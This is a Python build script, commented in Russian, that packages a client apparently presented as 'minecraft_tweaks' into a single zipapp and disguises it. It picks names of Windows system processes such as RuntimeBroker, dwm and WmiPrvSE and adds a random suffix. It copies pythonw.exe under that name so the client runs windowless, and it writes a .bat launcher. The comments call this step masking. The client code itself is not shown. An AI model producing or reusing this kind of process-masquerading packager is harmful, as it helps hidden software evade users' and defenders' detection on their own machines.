"""Универсальная сборка Python-клиента в один файл (как build-all.ps1 у Java-клиента).

Что делает:
  * сам выбирает правдоподобное имя (RuntimeBroker, ctfmon, dwm, … + случайный хвост);
  * собирает единый ``dist\\<Имя>.pyz`` (zipapp, без зависимостей);
  * делает маскировку: копию ``pythonw.exe`` под тем же именем + .bat-лончер;
  * проверяет результат (запуск ``--version``), печатает размер и sha256.

Использование:
  python build-all.py                 # авто-имена
  python build-all.py --name foo      # своё имя
  python build-all.py --exe pw.exe    # своё имя для exe
  python build-all.py --keep-old      # не чистить dist
"""

from __future__ import annotations

import argparse
import hashlib
import os
import random
import shutil
import subprocess
import sys
import zipapp
from pathlib import Path

ROOT = Path(__file__).resolve().parent
DIST = ROOT / "dist"

POOL = ["RuntimeBroker", "dwm", "nvcontainer", "audiodg", "sihost", "ctfmon",
        "SearchHost", "fontdrvhost", "WmiPrvSE", "taskhostw", "ShellExperienceHost"]


def random_name(ext: str) -> str:
    base = random.choice(POOL)
    tail = "".join(random.choice("0123456789abcdef") for _ in range(4))
    return f"{base}-{tail}{ext}"


def find_pythonw() -> Path:
    cand = Path(sys.executable).with_name("pythonw.exe")
    if cand.exists():
        return cand
    for p in (Path(sys.base_prefix) / "pythonw.exe",):
        if p.exists():
            return p
    raise SystemExit("pythonw.exe не найден рядом с python.exe")


def build(name: str, exe_name: str, keep_old: bool) -> int:
    DIST.mkdir(exist_ok=True)
    runtime = DIST / "runtime"

    if not keep_old:
        for p in list(DIST.glob("*.pyz")) + list(DIST.glob("*.bat")):
            p.unlink(missing_ok=True)
        if runtime.exists():
            shutil.rmtree(runtime, ignore_errors=True)
    runtime.mkdir(parents=True, exist_ok=True)

    print("[1/4] zipapp: собираю единый файл")
    pyz = DIST / f"{name}.pyz"
    zipapp.create_archive(
        source=ROOT,
        target=pyz,
        interpreter="/usr/bin/env python" if os.name != "nt" else None,
        main="minecraft_tweaks.watchdog:main",
        filter=lambda p: not any(part in {"dist", "__pycache__", ".git", "tests"}
                                 for part in Path(p).parts),
        compressed=True,
    )

    print("[2/4] маскировка: pythonw.exe + .bat")
    exe = runtime / exe_name
    shutil.copy2(find_pythonw(), exe)
    bat = DIST / f"{name}.bat"
    bat.write_text(
        "@echo off\r\n"
        f'start "" "%~dp0runtime\\{exe_name}" "%~dp0{name}.pyz" %*\r\n',
        encoding="utf-8", newline="")

    print("[3/4] проверка")
    out = subprocess.run([sys.executable, str(pyz), "--version"],
                         capture_output=True, text=True, timeout=120)
    if out.returncode != 0:
        print(out.stdout, out.stderr)
        return 1

    print("[4/4] готово")
    size = pyz.stat().st_size
    sha = hashlib.sha256(pyz.read_bytes()).hexdigest()[:16].upper()
    print(f"  {pyz.name}: {size:,} байт, sha256:{sha}")
    print(f"  запуск: {bat}")
    print(f"  {out.stdout.strip()}")
    return 0


def main(argv: list[str] | None = None) -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--name", default=None, help="имя клиента (по умолчанию случайное)")
    ap.add_argument("--exe", dest="exe_name", default=None, help="имя замаскированного exe")
    ap.add_argument("--keep-old", action="store_true", help="не удалять старые сборки")
    args = ap.parse_args(argv)

    name = args.name or Path(random_name("")).stem
    exe_name = args.exe_name or f"{name}.exe"
    return build(name, exe_name, args.keep_old)


if __name__ == "__main__":
    raise SystemExit(main())
